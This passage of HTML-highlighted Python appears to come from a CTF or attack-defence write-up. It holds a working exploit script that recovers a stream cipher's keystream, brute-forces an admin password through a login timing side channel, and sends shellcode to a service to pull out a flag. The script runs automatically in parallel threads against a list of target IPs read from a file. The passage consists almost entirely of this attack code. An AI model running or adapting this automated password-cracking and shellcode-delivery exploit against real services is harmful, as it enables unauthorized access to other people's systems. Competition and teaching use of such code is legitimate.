style="color:#A65E2B"> PORT</span><span style="color:#2993a3">)</span><br><span style="color:#1E754F">    return</span><span style="color:#393A34"> process</span><span style="color:#2993a3">(</span><span style="color:#A65E2B">BINARY</span><span style="color:#2993a3">)</span><br><br><br><span style="color:#AB5959">def</span><span style="color:#59873A"> timing_attack</span><span style="color:#2993a3">(</span><span style="color:#393A34">tube</span><span style="color:#999999">,</span><span style="color:#393A34"> cipher</span><span style="color:#999999">,</span><span style="color:#393A34"> charset</span><span style="color:#AB5959">=</span><span style="color:#1E754F">None</span><span style="color:#999999">,</span><span style="color:#393A34"> max_len</span><span style="color:#AB5959">=</span><span style="color:#2F798A">64</span><span style="color:#2993a3">)</span><span style="color:#999999">:</span><br><span style="color:#1E754F">    if</span><span style="color:#393A34"> charset </span><span style="color:#AB5959">is</span><span style="color:#1E754F"> None</span><span style="color:#999999">:</span><br><span style="color:#393A34">        charset </span><span style="color:#999999">=</span><span style="color:#393A34"> string</span><span style="color:#999999">.</span><span style="color:#393A34">ascii_letters </span><span style="color:#AB5959">+</span><span style="color:#393A34"> string</span><span style="color:#999999">.</span><span style="color:#393A34">digits </span><span style="color:#AB5959">+</span><span style="color:#B5695977"> "</span><span style="color:#A65E2B">{}</span><span style="color:#B56959">_!@#$%^&#x26;*()-_=+</span><span style="color:#B5695977">"</span><br><br><span style="color:#AB5959">    def</span><span style="color:#59873A"> send_enc</span><span style="color:#2993a3">(</span><span style="color:#393A34">data</span><span style="color:#2993a3">)</span><span style="color:#999999">:</span><br><span style="color:#393A34">        tube</span><span style="color:#999999">.</span><span style="color:#393A34">sendline</span><span style="color:#2993a3">(</span><span style="color:#393A34">cipher</span><span style="color:#999999">.</span><span style="color:#393A34">encrypt</span><span style="color:#1e754f">(</span><span style="color:#393A34">data</span><span style="color:#1e754f">)</span><span style="color:#999999">.</span><span style="color:#393A34">hex</span><span style="color:#1e754f">(</span><span style="color:#1e754f">)</span><span style="color:#999999">.</span><span style="color:#393A34">encode</span><span style="color:#1e754f">(</span><span style="color:#1e754f">)</span><span style="color:#2993a3">)</span><br><br><span style="color:#AB5959">    def</span><span style="color:#59873A"> recv_plain</span><span style="color:#2993a3">(</span><span style="color:#393A34">label</span><span style="color:#AB5959">=</span><span style="color:#B5695977">""</span><span style="color:#2993a3">)</span><span style="color:#999999">:</span><br><span style="color:#393A34">        line </span><span style="color:#999999">=</span><span style="color:#393A34"> tube</span><span style="color:#999999">.</span><span style="color:#393A34">recvline</span><span style="color:#2993a3">(</span><span style="color:#2993a3">)</span><br><span style="color:#1E754F">        if</span><span style="color:#AB5959"> not</span><span style="color:#393A34"> line</span><span style="color:#999999">:</span><br><span style="color:#1E754F">            raise</span><span style="color:#998418"> EOFError</span><span style="color:#2993a3">(</span><span style="color:#AB5959">f</span><span style="color:#B56959">"Disconnected while reading </span><span style="color:#1e754f">{</span><span style="color:#393A34">label</span><span style="color:#1e754f">}</span><span style="color:#B56959">"</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">        ct </span><span style="color:#999999">=</span><span style="color:#998418"> bytes</span><span style="color:#999999">.</span><span style="color:#393A34">fromhex</span><span style="color:#2993a3">(</span><span style="color:#393A34">line</span><span style="color:#999999">.</span><span style="color:#393A34">strip</span><span style="color:#1e754f">(</span><span style="color:#1e754f">)</span><span style="color:#999999">.</span><span style="color:#393A34">decode</span><span style="color:#1e754f">(</span><span style="color:#1e754f">)</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">        pt </span><span style="color:#999999">=</span><span style="color:#393A34"> cipher</span><span style="color:#999999">.</span><span style="color:#393A34">decrypt</span><span style="color:#2993a3">(</span><span style="color:#393A34">ct</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">        log</span><span style="color:#999999">.</span><span style="color:#393A34">debug</span><span style="color:#2993a3">(</span><span style="color:#AB5959">f</span><span style="color:#B56959">"</span><span style="color:#1e754f">{</span><span style="color:#393A34">label</span><span style="color:#1e754f">}</span><span style="color:#B56959">: </span><span style="color:#1e754f">{</span><span style="color:#393A34">pt</span><span style="color:#AB5959">!r</span><span style="color:#1e754f">}</span><span style="color:#B56959">"</span><span style="color:#2993a3">)</span><br><span style="color:#1E754F">        return</span><span style="color:#393A34"> pt</span><br><br><span style="color:#AB5959">    def</span><span style="color:#59873A"> login_once</span><span style="color:#2993a3">(</span><span style="color:#393A34">password</span><span style="color:#999999">,</span><span style="color:#393A34"> username</span><span style="color:#AB5959">=</span><span style="color:#AB5959">b</span><span style="color:#B5695977">"</span><span style="color:#B56959">admin</span><span style="color:#B5695977">"</span><span style="color:#2993a3">)</span><span style="color:#999999">:</span><br><span style="color:#393A34">        send_enc</span><span style="color:#2993a3">(</span><span style="color:#B5695977">"</span><span style="color:#B56959">2</span><span style="color:#B5695977">"</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">        recv_plain</span><span style="color:#2993a3">(</span><span style="color:#B5695977">"</span><span style="color:#B56959">username prompt</span><span style="color:#B5695977">"</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">        send_enc</span><span style="color:#2993a3">(</span><span style="color:#393A34">username</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">        recv_plain</span><span style="color:#2993a3">(</span><span style="color:#B5695977">"</span><span style="color:#B56959">password prompt</span><span style="color:#B5695977">"</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">        send_enc</span><span style="color:#2993a3">(</span><span style="color:#393A34">password</span><span style="color:#2993a3">)</span><br><span style="color:#1E754F">        return</span><span style="color:#393A34"> recv_plain</span><span style="color:#2993a3">(</span><span style="color:#B5695977">"</span><span style="color:#B56959">login result</span><span style="color:#B5695977">"</span><span style="color:#2993a3">)</span><br><br><span style="color:#AB5959">    def</span><span style="color:#59873A"> parse_ms</span><span style="color:#2993a3">(</span><span style="color:#393A34">resp</span><span style="color:#999999">:</span><span style="color:#998418"> bytes</span><span style="color:#2993a3">)</span><span style="color:#999999">:</span><br><span style="color:#393A34">        m </span><span style="color:#999999">=</span><span style="color:#393A34"> re</span><span style="color:#999999">.</span><span style="color:#393A34">search</span><span style="color:#2993a3">(</span><span style="color:#AB5959">rb</span><span style="color:#B5695977">"</span><span style="color:#AB5E3F">Login failed </span><span style="color:#BDA437">\(</span><span style="color:#999999">(</span><span style="color:#998418">\d</span><span style="color:#2F798A">+</span><span style="color:#999999">)</span><span style="color:#AB5E3F"> ms</span><span style="color:#BDA437">\)</span><span style="color:#B5695977">"</span><span style="color:#999999">,</span><span style="color:#393A34"> resp</span><span style="color:#2993a3">)</span><br><span style="color:#1E754F">        return</span><span style="color:#998418"> int</span><span style="color:#2993a3">(</span><span style="color:#393A34">m</span><span style="color:#999999">.</span><span style="color:#393A34">group</span><span style="color:#1e754f">(</span><span style="color:#2F798A">1</span><span style="color:#1e754f">)</span><span style="color:#2993a3">)</span><span style="color:#1E754F"> if</span><span style="color:#393A34"> m </span><span style="color:#1E754F">else</span><span style="color:#1E754F"> None</span><br><br><span style="color:#393A34">    known </span><span style="color:#999999">=</span><span style="color:#B5695977"> ""</span><br><span style="color:#1E754F">    while</span><span style="color:#998418"> len</span><span style="color:#2993a3">(</span><span style="color:#393A34">known</span><span style="color:#2993a3">)</span><span style="color:#AB5959"> </span><span style="color:#AB5959">&#x3C;</span><span style="color:#393A34"> max_len</span><span style="color:#999999">:</span><br><span style="color:#393A34">        best_ch</span><span style="color:#999999">,</span><span style="color:#393A34"> best_ms </span><span style="color:#999999">=</span><span style="color:#1E754F"> None</span><span style="color:#999999">,</span><span style="color:#AB5959"> -</span><span style="color:#2F798A">1</span><br><span style="color:#1E754F">        for</span><span style="color:#393A34"> ch </span><span style="color:#1E754F">in</span><span style="color:#393A34"> charset</span><span style="color:#999999">:</span><br><span style="color:#393A34">            guess </span><span style="color:#999999">=</span><span style="color:#999999"> </span><span style="color:#2993a3">(</span><span style="color:#393A34">known </span><span style="color:#AB5959">+</span><span style="color:#393A34"> ch</span><span style="color:#2993a3">)</span><span style="color:#999999">.</span><span style="color:#393A34">encode</span><span style="color:#2993a3">(</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">            resp </span><span style="color:#999999">=</span><span style="color:#393A34"> login_once</span><span style="color:#2993a3">(</span><span style="color:#393A34">guess</span><span style="color:#2993a3">)</span><br><br><span style="color:#1E754F">            if</span><span style="color:#393A34"> resp</span><span style="color:#999999">.</span><span style="color:#393A34">startswith</span><span style="color:#2993a3">(</span><span style="color:#AB5959">b</span><span style="color:#B5695977">"</span><span style="color:#B56959">Welcome, admin!</span><span style="color:#B5695977">"</span><span style="color:#2993a3">)</span><span style="color:#999999">:</span><br><span style="color:#1E754F">                return</span><span style="color:#393A34"> known </span><span style="color:#AB5959">+</span><span style="color:#393A34"> ch</span><br><br><span style="color:#393A34">            ms </span><span style="color:#999999">=</span><span style="color:#393A34"> parse_ms</span><span style="color:#2993a3">(</span><span style="color:#393A34">resp</span><span style="color:#2993a3">)</span><br><span style="color:#1E754F">            if</span><span style="color:#393A34"> ms </span><span style="color:#AB5959">is</span><span style="color:#1E754F"> None</span><span style="color:#999999">:</span><br><span style="color:#393A34">                log</span><span style="color:#999999">.</span><span style="color:#393A34">warning</span><span style="color:#2993a3">(</span><span style="color:#AB5959">f</span><span style="color:#B56959">"Timing parse failed for </span><span style="color:#1e754f">{</span><span style="color:#393A34">ch</span><span style="color:#AB5959">!r</span><span style="color:#1e754f">}</span><span style="color:#B56959">: </span><span style="color:#1e754f">{</span><span style="color:#393A34">resp</span><span style="color:#AB5959">!r</span><span style="color:#1e754f">}</span><span style="color:#B56959">"</span><span style="color:#2993a3">)</span><br><span style="color:#1E754F">                continue</span><br><span style="color:#1E754F">            if</span><span style="color:#393A34"> ms </span><span style="color:#AB5959">></span><span style="color:#393A34"> best_ms</span><span style="color:#999999">:</span><br><span style="color:#393A34">                best_ms</span><span style="color:#999999">,</span><span style="color:#393A34"> best_ch </span><span style="color:#999999">=</span><span style="color:#393A34"> ms</span><span style="color:#999999">,</span><span style="color:#393A34"> ch</span><br><br><span style="color:#1E754F">        if</span><span style="color:#393A34"> best_ch </span><span style="color:#AB5959">is</span><span style="color:#1E754F"> None</span><span style="color:#999999">:</span><br><span style="color:#1E754F">            raise</span><span style="color:#998418"> RuntimeError</span><span style="color:#2993a3">(</span><span style="color:#B5695977">"</span><span style="color:#B56959">Timing attack stalled (no candidate improved timing)</span><span style="color:#B5695977">"</span><span style="color:#2993a3">)</span><br><span style="color:#1E754F">        if</span><span style="color:#393A34"> best_ms </span><span style="color:#AB5959">==</span><span style="color:#2F798A"> 0</span><span style="color:#AB5959"> and</span><span style="color:#AB5959"> not</span><span style="color:#393A34"> known</span><span style="color:#999999">:</span><br><span style="color:#1E754F">            raise</span><span style="color:#998418"> RuntimeError</span><span style="color:#2993a3">(</span><span style="color:#B5695977">"</span><span style="color:#B56959">All candidates leaked 0 ms; check username/charset.</span><span style="color:#B5695977">"</span><span style="color:#2993a3">)</span><br><br><span style="color:#393A34">        known </span><span style="color:#999999">+=</span><span style="color:#393A34"> best_ch</span><br><span style="color:#393A34">        log</span><span style="color:#999999">.</span><span style="color:#393A34">info</span><span style="color:#2993a3">(</span><span style="color:#AB5959">f</span><span style="color:#B56959">"Progress: </span><span style="color:#1e754f">{</span><span style="color:#393A34">known</span><span style="color:#AB5959">!r</span><span style="color:#1e754f">}</span><span style="color:#B56959"> (delay </span><span style="color:#1e754f">{</span><span style="color:#393A34">best_ms</span><span style="color:#1e754f">}</span><span style="color:#B56959"> ms)"</span><span style="color:#2993a3">)</span><br><br><span style="color:#1E754F">    raise</span><span style="color:#998418"> RuntimeError</span><span style="color:#2993a3">(</span><span style="color:#B5695977">"</span><span style="color:#B56959">Password length exceeded without success</span><span style="color:#B5695977">"</span><span style="color:#2993a3">)</span><br><br><br><span style="color:#AB5959">def</span><span style="color:#59873A"> pwn_target</span><span style="color:#2993a3">(</span><span style="color:#393A34">ip</span><span style="color:#999999">,</span><span style="color:#393A34"> port</span><span style="color:#2993a3">)</span><span style="color:#999999">:</span><br><span style="color:#393A34">    tube </span><span style="color:#999999">=</span><span style="color:#1E754F"> None</span><br><span style="color:#393A34">    log</span><span style="color:#999999">.</span><span style="color:#393A34">info</span><span style="color:#2993a3">(</span><span style="color:#AB5959">f</span><span style="color:#B56959">"[</span><span style="color:#1e754f">{</span><span style="color:#393A34">ip</span><span style="color:#1e754f">}</span><span style="color:#B56959">:</span><span style="color:#1e754f">{</span><span style="color:#393A34">port</span><span style="color:#1e754f">}</span><span style="color:#B56959">] Starting exploit thread"</span><span style="color:#2993a3">)</span><br><span style="color:#1E754F">    try</span><span style="color:#999999">:</span><br><span style="color:#393A34">        tube </span><span style="color:#999999">=</span><span style="color:#393A34"> remote</span><span style="color:#2993a3">(</span><span style="color:#393A34">ip</span><span style="color:#999999">,</span><span style="color:#393A34"> port</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">        cipher </span><span style="color:#999999">=</span><span style="color:#393A34"> recover_cipher</span><span style="color:#2993a3">(</span><span style="color:#393A34">tube</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">        log</span><span style="color:#999999">.</span><span style="color:#393A34">success</span><span style="color:#2993a3">(</span><span style="color:#AB5959">f</span><span style="color:#B56959">"[</span><span style="color:#1e754f">{</span><span style="color:#393A34">ip</span><span style="color:#1e754f">}</span><span style="color:#B56959">:</span><span style="color:#1e754f">{</span><span style="color:#393A34">port</span><span style="color:#1e754f">}</span><span style="color:#B56959">] Keystream/LCG recovered and cipher synced."</span><span style="color:#2993a3">)</span><br><br><span style="color:#393A34">        password </span><span style="color:#999999">=</span><span style="color:#393A34"> timing_attack</span><span style="color:#2993a3">(</span><span style="color:#393A34">tube</span><span style="color:#999999">,</span><span style="color:#393A34"> cipher</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">        log</span><span style="color:#999999">.</span><span style="color:#393A34">success</span><span style="color:#2993a3">(</span><span style="color:#AB5959">f</span><span style="color:#B56959">"[</span><span style="color:#1e754f">{</span><span style="color:#393A34">ip</span><span style="color:#1e754f">}</span><span style="color:#B56959">:</span><span style="color:#1e754f">{</span><span style="color:#393A34">port</span><span style="color:#1e754f">}</span><span style="color:#B56959">] Recovered password: </span><span style="color:#1e754f">{</span><span style="color:#393A34">password</span><span style="color:#1e754f">}</span><span style="color:#B56959">"</span><span style="color:#2993a3">)</span><br><br><span style="color:#A0ADA0">        # Final login to ensure admin session</span><br><span style="color:#AB5959">        def</span><span style="color:#59873A"> send_enc</span><span style="color:#2993a3">(</span><span style="color:#393A34">data</span><span style="color:#2993a3">)</span><span style="color:#999999">:</span><br><span style="color:#393A34">            tube</span><span style="color:#999999">.</span><span style="color:#393A34">sendline</span><span style="color:#2993a3">(</span><span style="color:#393A34">cipher</span><span style="color:#999999">.</span><span style="color:#393A34">encrypt</span><span style="color:#1e754f">(</span><span style="color:#393A34">data</span><span style="color:#1e754f">)</span><span style="color:#999999">.</span><span style="color:#393A34">hex</span><span style="color:#1e754f">(</span><span style="color:#1e754f">)</span><span style="color:#999999">.</span><span style="color:#393A34">encode</span><span style="color:#1e754f">(</span><span style="color:#1e754f">)</span><span style="color:#2993a3">)</span><br><br><span style="color:#AB5959">        def</span><span style="color:#59873A"> recv_plain</span><span style="color:#2993a3">(</span><span style="color:#393A34">label</span><span style="color:#AB5959">=</span><span style="color:#B5695977">""</span><span style="color:#2993a3">)</span><span style="color:#999999">:</span><br><span style="color:#393A34">            line </span><span style="color:#999999">=</span><span style="color:#393A34"> tube</span><span style="color:#999999">.</span><span style="color:#393A34">recvline</span><span style="color:#2993a3">(</span><span style="color:#2993a3">)</span><br><span style="color:#1E754F">            if</span><span style="color:#AB5959"> not</span><span style="color:#393A34"> line</span><span style="color:#999999">:</span><br><span style="color:#1E754F">                raise</span><span style="color:#998418"> EOFError</span><span style="color:#2993a3">(</span><span style="color:#AB5959">f</span><span style="color:#B56959">"Disconnected while reading </span><span style="color:#1e754f">{</span><span style="color:#393A34">label</span><span style="color:#1e754f">}</span><span style="color:#B56959">"</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">            pt </span><span style="color:#999999">=</span><span style="color:#393A34"> cipher</span><span style="color:#999999">.</span><span style="color:#393A34">decrypt</span><span style="color:#2993a3">(</span><span style="color:#998418">bytes</span><span style="color:#999999">.</span><span style="color:#393A34">fromhex</span><span style="color:#1e754f">(</span><span style="color:#393A34">line</span><span style="color:#999999">.</span><span style="color:#393A34">strip</span><span style="color:#a65e2b">(</span><span style="color:#a65e2b">)</span><span style="color:#999999">.</span><span style="color:#393A34">decode</span><span style="color:#a65e2b">(</span><span style="color:#a65e2b">)</span><span style="color:#1e754f">)</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">            log</span><span style="color:#999999">.</span><span style="color:#393A34">debug</span><span style="color:#2993a3">(</span><span style="color:#AB5959">f</span><span style="color:#B56959">"</span><span style="color:#1e754f">{</span><span style="color:#393A34">label</span><span style="color:#1e754f">}</span><span style="color:#B56959">: </span><span style="color:#1e754f">{</span><span style="color:#393A34">pt</span><span style="color:#AB5959">!r</span><span style="color:#1e754f">}</span><span style="color:#B56959">"</span><span style="color:#2993a3">)</span><br><span style="color:#1E754F">            return</span><span style="color:#393A34"> pt</span><br><br><span style="color:#393A34">        send_enc</span><span style="color:#2993a3">(</span><span style="color:#B5695977">"</span><span style="color:#B56959">2</span><span style="color:#B5695977">"</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">        recv_plain</span><span style="color:#2993a3">(</span><span style="color:#B5695977">"</span><span style="color:#B56959">username prompt (final)</span><span style="color:#B5695977">"</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">        send_enc</span><span style="color:#2993a3">(</span><span style="color:#B5695977">"</span><span style="color:#B56959">admin</span><span style="color:#B5695977">"</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">        recv_plain</span><span style="color:#2993a3">(</span><span style="color:#B5695977">"</span><span style="color:#B56959">password prompt (final)</span><span style="color:#B5695977">"</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">        send_enc</span><span style="color:#2993a3">(</span><span style="color:#393A34">password</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">        resp </span><span style="color:#999999">=</span><span style="color:#393A34"> recv_plain</span><span style="color:#2993a3">(</span><span style="color:#B5695977">"</span><span style="color:#B56959">login result (final)</span><span style="color:#B5695977">"</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">        log</span><span style="color:#999999">.</span><span style="color:#393A34">info</span><span style="color:#2993a3">(</span><span style="color:#AB5959">f</span><span style="color:#B56959">"[</span><span style="color:#1e754f">{</span><span style="color:#393A34">ip</span><span style="color:#1e754f">}</span><span style="color:#B56959">:</span><span style="color:#1e754f">{</span><span style="color:#393A34">port</span><span style="color:#1e754f">}</span><span style="color:#B56959">] Login response: </span><span style="color:#1e754f">{</span><span style="color:#393A34">resp</span><span style="color:#AB5959">!r</span><span style="color:#1e754f">}</span><span style="color:#B56959">"</span><span style="color:#2993a3">)</span><br><br><span style="color:#393A34">        send_enc</span><span style="color:#2993a3">(</span><span style="color:#B5695977">"</span><span style="color:#B56959">3</span><span style="color:#B5695977">"</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">        recv_plain</span><span style="color:#2993a3">(</span><span style="color:#B5695977">"</span><span style="color:#B56959">MagicCode prompt</span><span style="color:#B5695977">"</span><span style="color:#2993a3">)</span><br><span style="color:#1E754F">        with</span><span style="color:#998418"> open</span><span style="color:#2993a3">(</span><span style="color:#B5695977">"</span><span style="color:#B56959">./myshellcode</span><span style="color:#B5695977">"</span><span style="color:#999999">,</span><span style="color:#B5695977"> "</span><span style="color:#B56959">rb</span><span style="color:#B5695977">"</span><span style="color:#2993a3">)</span><span style="color:#1E754F"> as</span><span style="color:#393A34"> f</span><span style="color:#999999">:</span><br><span style="color:#393A34">            orw </span><span style="color:#999999">=</span><span style="color:#393A34"> f</span><span style="color:#999999">.</span><span style="color:#393A34">read</span><span style="color:#2993a3">(</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">        send_enc</span><span style="color:#2993a3">(</span><span style="color:#393A34">orw</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">        resp </span><span style="color:#999999">=</span><span style="color:#393A34"> recv_plain</span><span style="color:#2993a3">(</span><span style="color:#B5695977">"</span><span style="color:#B56959">MagicCode response</span><span style="color:#B5695977">"</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">        log</span><span style="color:#999999">.</span><span style="color:#393A34">info</span><span style="color:#2993a3">(</span><span style="color:#AB5959">f</span><span style="color:#B56959">"[</span><span style="color:#1e754f">{</span><span style="color:#393A34">ip</span><span style="color:#1e754f">}</span><span style="color:#B56959">:</span><span style="color:#1e754f">{</span><span style="color:#393A34">port</span><span style="color:#1e754f">}</span><span style="color:#B56959">] MagicCode response: </span><span style="color:#1e754f">{</span><span style="color:#393A34">resp</span><span style="color:#AB5959">!r</span><span style="color:#1e754f">}</span><span style="color:#B56959">"</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">        send_enc</span><span style="color:#2993a3">(</span><span style="color:#B5695977">"</span><span style="color:#B56959">4</span><span style="color:#B5695977">"</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">        resp </span><span style="color:#999999">=</span><span style="color:#393A34"> recv_plain</span><span style="color:#2993a3">(</span><span style="color:#B5695977">"</span><span style="color:#B56959">sandbox</span><span style="color:#B5695977">"</span><span style="color:#2993a3">)</span><br><br><span style="color:#AB5959">        def</span><span style="color:#59873A"> parse_hex_response</span><span style="color:#2993a3">(</span><span style="color:#393A34">line</span><span style="color:#999999">:</span><span style="color:#998418"> str</span><span style="color:#2993a3">)</span><span style="color:#999999"> -</span><span style="color:#999999">></span><span style="color:#998418"> str</span><span style="color:#999999">:</span><br><span style="color:#A0ADA0">            # 抽取 hex 部分（只要连续 hex 字符即可）</span><br><span style="color:#393A34">            m </span><span style="color:#999999">=</span><span style="color:#393A34"> re</span><span style="color:#999999">.</span><span style="color:#393A34">search</span><span style="color:#2993a3">(</span><span style="color:#AB5959">r</span><span style="color:#B5695977">'</span><span style="color:#999999">(</span><span style="color:#A65E2B">[0-9a-fA-F]</span><span style="color:#2F798A">{2,}</span><span style="color:#999999">)</span><span style="color:#B5695977">'</span><span style="color:#999999">,</span><span style="color:#393A34"> line</span><span style="color:#2993a3">)</span><br><span style="color:#1E754F">            if</span><span style="color:#AB5959"> not</span><span style="color:#393A34"> m</span><span style="color:#999999">:</span><br><span style="color:#1E754F">                return</span><span style="color:#1E754F"> None</span><br><br><span style="color:#393A34">            hex_str </span><span style="color:#999999">=</span><span style="color:#393A34"> m</span><span style="color:#999999">.</span><span style="color:#393A34">group</span><span style="color:#2993a3">(</span><span style="color:#2F798A">1</span><span style="color:#2993a3">)</span><br><br><span style="color:#1E754F">            try</span><span style="color:#999999">:</span><br><span style="color:#393A34">                data </span><span style="color:#999999">=</span><span style="color:#393A34"> binascii</span><span style="color:#999999">.</span><span style="color:#393A34">unhexlify</span><span style="color:#2993a3">(</span><span style="color:#393A34">hex_str</span><span style="color:#2993a3">)</span><br><span style="color:#1E754F">                return</span><span style="color:#393A34"> data</span><span style="color:#999999">.</span><span style="color:#393A34">decode</span><span style="color:#2993a3">(</span><span style="color:#B07D48">errors</span><span style="color:#999999">=</span><span style="color:#B5695977">'</span><span style="color:#B56959">replace</span><span style="color:#B5695977">'</span><span style="color:#2993a3">)</span><span style="color:#999999">.</span><span style="color:#393A34">rstrip</span><span style="color:#2993a3">(</span><span style="color:#B5695977">'</span><span style="color:#A65E2B">\n</span><span style="color:#B5695977">'</span><span style="color:#2993a3">)</span><br><span style="color:#1E754F">            except</span><span style="color:#998418"> Exception</span><span style="color:#999999">:</span><br><span style="color:#1E754F">                return</span><span style="color:#1E754F"> None</span><br><br><span style="color:#393A34">        flag </span><span style="color:#999999">=</span><span style="color:#393A34"> parse_hex_response</span><span style="color:#2993a3">(</span><span style="color:#393A34">resp</span><span style="color:#999999">.</span><span style="color:#393A34">decode</span><span style="color:#1e754f">(</span><span style="color:#1e754f">)</span><span style="color:#2993a3">)</span><br><span style="color:#1E754F">        if</span><span style="color:#393A34"> flag</span><span style="color:#999999">:</span><br><span style="color:#393A34">            log</span><span style="color:#999999">.</span><span style="color:#393A34">success</span><span style="color:#2993a3">(</span><span style="color:#AB5959">f</span><span style="color:#B56959">"[</span><span style="color:#1e754f">{</span><span style="color:#393A34">ip</span><span style="color:#1e754f">}</span><span style="color:#B56959">:</span><span style="color:#1e754f">{</span><span style="color:#393A34">port</span><span style="color:#1e754f">}</span><span style="color:#B56959">] Extracted flag: </span><span style="color:#1e754f">{</span><span style="color:#393A34">flag</span><span style="color:#1e754f">}</span><span style="color:#B56959">"</span><span style="color:#2993a3">)</span><br><span style="color:#1E754F">        else</span><span style="color:#999999">:</span><br><span style="color:#393A34">            log</span><span style="color:#999999">.</span><span style="color:#393A34">warning</span><span style="color:#2993a3">(</span><span style="color:#AB5959">f</span><span style="color:#B56959">"[</span><span style="color:#1e754f">{</span><span style="color:#393A34">ip</span><span style="color:#1e754f">}</span><span style="color:#B56959">:</span><span style="color:#1e754f">{</span><span style="color:#393A34">port</span><span style="color:#1e754f">}</span><span style="color:#B56959">] Failed to extract flag from response."</span><span style="color:#2993a3">)</span><br><span style="color:#1E754F">        return</span><span style="color:#393A34"> flag</span><br><span style="color:#1E754F">    except</span><span style="color:#998418"> Exception</span><span style="color:#1E754F"> as</span><span style="color:#393A34"> exc</span><span style="color:#999999">:</span><br><span style="color:#393A34">        log</span><span style="color:#999999">.</span><span style="color:#393A34">failure</span><span style="color:#2993a3">(</span><span style="color:#AB5959">f</span><span style="color:#B56959">"[</span><span style="color:#1e754f">{</span><span style="color:#393A34">ip</span><span style="color:#1e754f">}</span><span style="color:#B56959">:</span><span style="color:#1e754f">{</span><span style="color:#393A34">port</span><span style="color:#1e754f">}</span><span style="color:#B56959">] Exploit failed: </span><span style="color:#1e754f">{</span><span style="color:#393A34">exc</span><span style="color:#1e754f">}</span><span style="color:#B56959">"</span><span style="color:#2993a3">)</span><br><span style="color:#1E754F">        return</span><span style="color:#1E754F"> None</span><br><span style="color:#1E754F">    finally</span><span style="color:#999999">:</span><br><span style="color:#1E754F">        try</span><span style="color:#999999">:</span><br><span style="color:#1E754F">            if</span><span style="color:#393A34"> tube</span><span style="color:#999999">:</span><br><span style="color:#393A34">                tube</span><span style="color:#999999">.</span><span style="color:#393A34">close</span><span style="color:#2993a3">(</span><span style="color:#2993a3">)</span><br><span style="color:#1E754F">        except</span><span style="color:#998418"> Exception</span><span style="color:#999999">:</span><br><span style="color:#1E754F">            pass</span><br><br><br><span style="color:#A0ADA0"># ---------------------------------------------------------------------------</span><br><span style="color:#A0ADA0"># Worker：从文件中不断弹出 IP 并打</span><br><span style="color:#A0ADA0"># ---------------------------------------------------------------------------</span><br><br><span style="color:#AB5959">def</span><span style="color:#59873A"> worker_thread</span><span style="color:#2993a3">(</span><span style="color:#393A34">worker_id</span><span style="color:#999999">,</span><span style="color:#393A34"> filename</span><span style="color:#999999">,</span><span style="color:#393A34"> flags_list</span><span style="color:#999999">,</span><span style="color:#393A34"> flags_lock</span><span style="color:#2993a3">)</span><span style="color:#999999">:</span><br><span style="color:#1E754F">    while</span><span style="color:#1E754F"> True</span><span style="color:#999999">:</span><br><span style="color:#393A34">        target </span><span style="color:#999999">=</span><span style="color:#393A34"> pop_one_ip</span><span style="color:#2993a3">(</span><span style="color:#393A34">filename</span><span style="color:#2993a3">)</span><br><span style="color:#1E754F">        if</span><span style="color:#393A34"> target </span><span style="color:#AB5959">is</span><span style="color:#1E754F"> None</span><span style="color:#999999">:</span><br><span style="color:#393A34">            log</span><span style="color:#999999">.</span><span style="color:#393A34">info</span><span style="color:#2993a3">(</span><span style="color:#AB5959">f</span><span style="color:#B56959">"[worker </span><span style="color:#1e754f">{</span><span style="color:#393A34">worker_id</span><span style="color:#1e754f">}</span><span style="color:#B56959">] no more targets."</span><span style="color:#2993a3">)</span><br><span style="color:#1E754F">            break</span><br><br><span style="color:#393A34">        ip</span><span style="color:#999999">,</span><span style="color:#393A34"> port </span><span style="color:#999999">=</span><span style="color:#393A34"> target</span><br><span style="color:#393A34">        flag </span><span style="color:#999999">=</span><span style="color:#393A34"> pwn_target</span><span style="color:#2993a3">(</span><span style="color:#393A34">ip</span><span style="color:#999999">,</span><span style="color:#393A34"> port</span><span style="color:#2993a3">)</span><br><span style="color:#1E754F">        if</span><span style="color:#393A34"> flag</span><span style="color:#999999">:</span><br><span style="color:#1E754F">            with</span><span style="color:#393A34"> flags_lock</span><span style="color:#999999">:</span><br><span style="color:#393A34">                flags_list</span><span style="color:#999999">.</span><span style="color:#393A34">append</span><span style="color:#2993a3">(</span><span style="color:#393A34">flag</span><span style="color:#2993a3">)</span><br><br><br><span style="color:#A0ADA0"># ---------------------------------------------------------------------------</span><br><span style="color:#A0ADA0"># Main</span><br><span style="color:#A0ADA0"># ---------------------------------------------------------------------------</span><br><br><span style="color:#1E754F">if</span><span style="color:#998418"> __name__</span><span style="color:#AB5959"> ==</span><span style="color:#B5695977"> "</span><span style="color:#B56959">__main__</span><span style="color:#B5695977">"</span><span style="color:#999999">:</span><br><span style="color:#393A34">    filename </span><span style="color:#999999">=</span><span style="color:#B5695977"> "</span><span style="color:#B56959">csnote_ips.txt</span><span style="color:#B5695977">"</span><br><span style="color:#393A34">    flags </span><span style="color:#999999">=</span><span style="color:#999999"> </span><span style="color:#2993a3">[</span><span style="color:#2993a3">]</span><br><span style="color:#393A34">    flags_lock </span><span style="color:#999999">=</span><span style="color:#393A34"> Lock</span><span style="color:#2993a3">(</span><span style="color:#2993a3">)</span><br><br><span style="color:#393A34">    max_workers </span><span 